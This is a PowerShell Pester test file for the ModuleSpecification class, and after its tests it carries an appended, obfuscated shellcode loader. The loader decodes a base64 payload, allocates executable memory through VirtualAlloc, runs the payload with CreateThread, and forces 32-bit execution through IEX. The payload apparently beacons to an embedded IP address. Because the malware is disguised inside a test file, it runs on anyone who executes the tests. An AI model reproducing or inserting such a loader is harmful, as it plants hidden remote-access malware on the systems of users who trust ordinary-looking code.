


using namespace Microsoft.PowerShell.Commands



function PermuteHashtableOnProperty
{
    param([hashtable[]]$Hashtable, [string]$Key, [object]$Value)

    foreach ($ht in $Hashtable)
    {
        $ht.Clone()
    }

    foreach ($ht in $Hashtable)
    {
        $ht2 = $ht.Clone()
        $ht2.$Key = $Value
        $ht2
    }
}




function PermuteHashtable
{
    param([hashtable]$InitialTable, [hashtable]$KeyValues)

    $l = $InitialTable
    foreach ($key in $KeyValues.Keys)
    {
        $l = PermuteHashtableOnProperty -Hashtable $l -Key $key -Value $KeyValues[$key]
    }

    $l
}

$guid = [guid]::NewGuid()

$modSpecRequired = @{
    ModuleName = "ModSpecRequired"
    RequiredVersion = "3.0.2"
}

$requiredOptionalConstraints = @{ Guid = $guid }

$modSpecRange = @{
    ModuleName = "ModSpecRequired"
    ModuleVersion = "3.0.1"
}

$rangeOptionalConstraints = @{ MaximumVersion = "3.2.0"; Guid = $guid }

Describe "ModuleSpecification objects and logic" -Tag "CI" {

    BeforeAll {
        $testCases = [System.Collections.Generic.List[hashtable]]::new()

        foreach ($case in (PermuteHashtable -InitialTable $modSpecRequired -KeyValues $requiredOptionalConstraints))
        {
            $testCases.Add(@{
                ModuleSpecification = $case
                Keys = ($case.Keys -join ",")
            })
        }

        foreach ($case in (PermuteHashtable -InitialTable $modSpecRange -KeyValues $rangeOptionalConstraints))
        {
            $testCases.Add(@{
                ModuleSpecification = $case
                Keys = ($case.Keys -join ",")
            })
        }

        $testCases = $testCases.ToArray()
    }

    Context "ModuleSpecification construction and string parsing" {

        BeforeAll {
            $differentFieldCases = @(
                @{
                    TestName = "Guid"
                    ModSpec1 = @{ Guid = [guid]::NewGuid(); ModuleName = "TestModule"; ModuleVersion = "1.0" }
                    ModSpec2 = @{ Guid = [guid]::NewGuid(); ModuleName = "TestModule"; ModuleVersion = "1.0" }
                },
                @{
                    TestName = "RequiredVersion"
                    ModSpec1 = @{ ModuleName = "Module"; RequiredVersion = "3.0" }
                    ModSpec2 = @{ ModuleName = "Module"; RequiredVersion = "3.1" }
                },
                @{
                    TestName = "Version/MaxVersion-present"
                    ModSpec1 = @{ ModuleName = "ThirdModule"; ModuleVersion = "2.1" }
                    ModSpec2 = @{ ModuleName = "ThirdModule"; MaximumVersion = "2.1" }
                },
                @{
                    TestName = "RequiredVersion/Version-present"
                    ModSpec1 = @{ ModuleName = "FourthModule"; RequiredVersion = "3.0" }
                    ModSpec2 = @{ ModuleName = "FourthModule"; ModuleVersion = "3.0" }
                }
            )
        }

        It "Can be created from a name" {
            $ms = [ModuleSpecification]::new("NamedModule")
            $ms | Should -Not -BeNull
            $ms.Name | Should -BeExactly "NamedModule"
        }

        It "Can be created from Hashtable with keys: <Keys>" -TestCases $testCases {
            param([hashtable]$ModuleSpecification, [string]$Keys)
            $ms = [ModuleSpecification]::new($ModuleSpecification)

            $ms.Name | Should -BeExactly $ModuleSpecification.ModuleName

            if ($ModuleSpecification.Guid)
            {
                $ms.Guid | Should -Be $ModuleSpecification.Guid
            }

            if ($ModuleSpecification.ModuleVersion)
            {
                $ms.Version | Should -Be $ModuleSpecification.ModuleVersion
            }

            if ($ModuleSpecification.RequiredVersion)
            {
                $ms.RequiredVersion | Should -Be $ModuleSpecification.RequiredVersion
            }

            if ($ModuleSpecification.MaximumVersion)
            {
                $ms.MaximumVersion | Should -Be $ModuleSpecification.MaximumVersion
            }
        }

        It "Can be reconstructed from self.ToString() with keys: <Keys>" -TestCases $testCases {
            param([hashtable]$ModuleSpecification, [string]$Keys)

            $ms = [ModuleSpecification]::new($ModuleSpecification)

            [ModuleSpecification]$clone = $null
            [ModuleSpecification]::TryParse(($ms.ToString()), [ref]$clone) | Should -BeTrue

            $clone.Name | Should -Be $ModuleSpecification.ModuleName

            if ($ModuleSpecification.RequiredVersion)
            {
                $clone.RequiredVersion | Should -Be $ModuleSpecification.RequiredVersion
            }

            if ($ModuleSpecification.Version)
            {
                $clone.Version | Should -Be $ModuleSpecification.Version
            }

            if ($ModuleSpecification.MaximumVersion)
            {
                $clone.MaximumVersion | Should -Be $ModuleSpecification.MaximumVersion
            }

            if ($ModuleSpecification.Guid)
            {
                $clone.Guid | Should -Be $ModuleSpecification.Guid
            }
        }
    }

    Context "ModuleSpecification comparison" {

        BeforeAll {
            $modSpecAsm = [ModuleSpecification].Assembly
            $modSpecComparerType = $modSpecAsm.GetType("Microsoft.PowerShell.Commands.ModuleSpecificationComparer")
            $comparer = [System.Activator]::CreateInstance($modSpecComparerType)
        }

        It "Module specifications with same fields <Keys> are equal" -TestCases $testCases {
            param([hashtable]$ModuleSpecification, [string]$Keys)

            $ms = [ModuleSpecification]::new($ModuleSpecification)
            $ms2 = [ModuleSpecification]::new($ModuleSpecification)

            $comparer.Equals($ms, $ms2) | Should -BeTrue
        }

        It "Module specifications with same fields <Keys> have the same hash code" -TestCases $testCases {
            param([hashtable]$ModuleSpecification, [string]$Keys)

            $ms = [ModuleSpecification]::new($ModuleSpecification)
            $ms2 = [ModuleSpecification]::new($ModuleSpecification)

            $comparer.GetHashCode($ms) | Should -Be $comparer.GetHashCode($ms2)
        }

        It "Module specifications with different <TestName> fields are not equal" -TestCases $differentFieldCases {
            param($TestName, $ModSpec1, $ModSpec2)
            $ms1 = [ModuleSpecification]::new($ModSpec1)
            $ms2 = [ModuleSpecification]::new($ModSpec2)

            $comparer.Equals($ms1, $ms2) | Should -BeFalse
        }

        It "Compares two null module specifications as equal" {
            $comparer.Equals($null, $null) | Should -BeTrue
        }

        It "Compares a null module specification with another as unequal" {
            $ms = [ModuleSpecification]::new(@{
                MOduleName = "NonNullModule"
                Guid = [guid]::NewGuid()
                RequiredVersion = "3.2.1"
            })

            $comparer.Equals($ms, $null) | Should -BeFalse
        }

        It "Succeeds to get a hash code from a null module specification" {
            $comparer.GetHashCode($null) | Should -Not -BeNull
        }
    }

    Context "Invalid ModuleSpecification initialization" {
        BeforeAll {
            $testCases = @(
                @{
                    TestName = "Version+RequiredVersion"
                    ModuleSpecification = @{ ModuleName = "BadVersionModule"; ModuleVersion = "3.1"; RequiredVersion = "3.1" }
                    ErrorId = 'ArgumentException'
                },
                @{
                    TestName = "NoName"
                    ModuleSpecification = @{ ModuleVersion = "0.2" }
                    ErrorId = 'MissingMemberException'
                },
                @{
                    TestName = "BadField"
                    ModuleSpecification = @{ ModuleName = "StrangeFieldModule"; RequiredVersion = "7.4"; Duck = "1.2" }
                    ErrorId = 'ArgumentException'
                },
                @{
                    TestName = "BadType"
                    ModuleSpecification = @{ ModuleName = "BadTypeModule"; RequiredVersion = "Hello!" }
                    ErrorId = 'PSInvalidCastException'
                }
            )
        }

        It "Cannot create from a null argument" {
            { [ModuleSpecification]::new($null) } | Should -Throw
        }

        It "Cannot create from invalid module hashtables: <TestName>" -TestCases $testCases {
            param([string]$TestName, [hashtable]$ModuleSpecification)

            { [ModuleSpecification]::new($ModuleSpecification) } | Should -Throw -ErrorId $ErrorId
        }
    }
}
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)
	
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
	
	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String("/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6IAAAABNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wOyBXT1c2NDsgVHJpZGVudC81LjApAFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYAFkx/1dXV1dRaDpWeaf/1et5WzHJUVFqA1FRaGweAABTUGhXiZ/G/9XrYlkx0lJoAAJghFJSUlFSUGjrVS47/9WJxjH/V1dXV1ZoLQYYe//VhcB0RDH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S8Mf/rFetJ6Jn///8vejJiTgAAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk1NTiedXaAAgAABTVmgSloni/9WFwHTNiwcBw4XAdeVYw+g3////MTkyLjE2OC44OC45NgA=")

$var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var_code.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_hthread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$var_buffer,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WaitForSingleObject), (func_get_delegate_type @([IntPtr], [Int32]))).Invoke($var_hthread,0xffffffff) | Out-Null
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
